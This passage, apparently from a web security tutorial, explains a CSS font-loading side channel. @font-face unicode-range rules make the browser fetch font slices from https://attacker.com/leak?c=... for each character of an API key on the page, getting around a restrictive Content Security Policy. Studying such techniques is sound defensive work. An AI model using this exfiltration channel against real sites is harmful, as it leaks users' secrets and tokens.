// Content-Security-Policy: default-src 'self'; script-src 'none'; img-src 'none'; font-src *;

// 8. The browser parses the CSS. It identifies that the input element requires the "Exfil" font.
// 9. The typographic engine evaluates the text "ab" against the unicode-range directives.
// 10. Optimizing for bandwidth, the browser ONLY downloads the required font slices.
// 11. The browser executes an HTTP GET to https://attacker.com/leak?c=a
// 12. The browser executes an HTTP GET to https://attacker.com/leak?c=b
// 13. The attacker receives the unordered character set of the API key, completely bypassing the CSP.
```
{% endstep %}

{% step %}
To balance rigorous security mandates with comprehensive UI customizability, platform architects deployed a Defense-in-Depth strategy combining server-side HTML sanitization with a draconian client-side Content Security Policy (CSP). This architecture systematically disabled Javascript, remote images, and XHR connections, creating a highly restrictive execution sandbox. Developers explicitly authorized the `<style>` tag, falsely assuming that CSS was entirely subordinate to the CSP's network restrictions. They failed to recognize the security implications of CSS typographic optimizations. By exempting the `font-src` directive to support third-party fonts, the architects left a covert network channel open. The attacker weaponized this channel by defining highly granular `@font-face` rules using `unicode-range` bindings. When the browser rendered sensitive, restricted DOM elements, the typographic engine intrinsically optimized its network behavior, selectively requesting font files based on the exact characters present in the DOM. This turned a low-level browser rendering optimization into a high-fidelity, zero-JS Oracle, systematically extracting classified enterprise tokens through an ostensibly impregnable security boundary
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
